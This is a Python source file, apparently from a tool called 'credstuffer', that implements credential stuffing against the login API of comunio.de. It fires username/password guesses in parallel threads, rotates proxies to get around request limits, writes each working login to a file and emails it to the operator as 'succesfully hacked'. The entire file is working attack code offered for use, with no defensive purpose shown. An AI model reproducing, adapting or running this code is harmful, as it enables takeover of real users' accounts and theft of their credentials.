import logging
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

from credstuffer import UserAccount
from credstuffer import ROOT_DIR
from credstuffer.messenger import Mail, Telegram
from credstuffer.exceptions import ProxyNotSetError, ProxyMaxRequestError, ProxyBadConnectionError


class Comunio(UserAccount):
    """ class Comunio to provide basic methods for credstuffing comunio.de

    USAGE:
            comunio = Comunio(max_requests=10000, notify=None, SMTP=None, PORT=None, SENDER=None, RECEIVER=None, PASSWORD=None)

    """
    usernames = list()

    def __init__(self, max_requests=10000, notify=None, SMTP=None, PORT=None, SENDER=None, RECEIVER=None, PASSWORD=None):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Comunio')

        # init base class
        super().__init__()

        self.name = 'Comunio'
        self.credential_file = self.file_cracked + '_' + self.name
        self.notify = notify
        self.headers.update({
            'Origin': 'http://www.comunio.de',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': 'http://www.comunio.de/home',
            })
        self.comunio_login_url = 'https://api.comunio.de/login'
        self.max_requests = max_requests
        self.request_counter = 0
        self.mail = None

        if self.notify is not None:
            if 'mail' in self.notify:
                self.mail = Mail(smtp_server=SMTP, port=PORT, sender=SENDER, receiver=RECEIVER)
                self.mail.login(username=SENDER, password=PASSWORD)
        else:
            self.logger.info("No credential notifyer configured")

    def set_usernames(self, usernames):
        """ sets usernames for comunio account

        :param usernames: list of usernames
        """
        self.usernames = usernames

    def login(self, password):
        """ requests given login data to the account

        :return: None or request Response
        """

        # check if proxy is set
        if self.session.proxies:

            # check if we need a new proxy
            if self.request_counter < self.max_requests:

                with ThreadPoolExecutor(max_workers=len(self.usernames)) as executor:

                    future_response = {executor.submit(self.__request_login, user, password): user for user in self.usernames}
                    for future in as_completed(future_response):
                        user = future_response[future]
                        statuscode = future.result().status_code
                        self.logger.info("response code: {} from comunio with username: {}, password: {}, proxy: {}"
                                         .format(statuscode, user, password, self.session.proxies['http']))
                        if statuscode == 200:
                            self.notifyer(username=user, password=password)

            else:
                # raise Error to renew Proxy
                raise ProxyMaxRequestError("Max number of proxy requests reached!")
        else:
            raise ProxyNotSetError("No Proxy was set!")

    def notifyer(self, username, password):
        """ saves and sends a notification in success case

        :param username: string username
        :param password: string password
        """

        with open(ROOT_DIR + '/' + self.credential_file + '.txt', 'a') as file:
            self.logger.info("writing credential to file {}".format(self.credential_file))
            file.write("username: {}, password: {}\n".format(username, password))

        if self.mail is not None:
            self.mail.set_subject("CREDSTUFFER: Credential Notification!")
            mail_content = "CREDSTUFFER has succesfully hacked credential from account {}\n\nUsername: {}\nPassword: {}"\
                            .format(self.name, username, password)
            self.mail.set_body(mail_content)
            self.logger.info("send credential mail: {}".format(mail_content))
            self.mail.send()

    def __request_login(self, username, password):
        """ request login with an session object

        :return: Request response object
        """
        login_form = [('username', username), ('password', password), ]

        try:
            request_login = self.session.post(self.comunio_login_url, headers=self.headers, data=login_form,
                                              timeout=self.login_request_timeout, allow_redirects=False)
            
            self.request_counter += 1
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectTimeout, requests.exceptions.ReadTimeout) as e:
            # self.logger.error(e)
            raise ProxyBadConnectionError("Proxy Bad Connection")

        return request_login

    def set_proxy(self, proxy):
        """ sets a proxy

        """
        if isinstance(proxy, dict):
            alive = self.is_proxy_alive(proxy=proxy)
            if alive:
                self.logger.info("set proxy to {}".format(proxy['http']))
                self.session.proxies = proxy
                return True
            else:
                raise ProxyBadConnectionError("Renew proxy due to bad connection!")
        else:
            raise TypeError("proxy must be type of dictionary!")

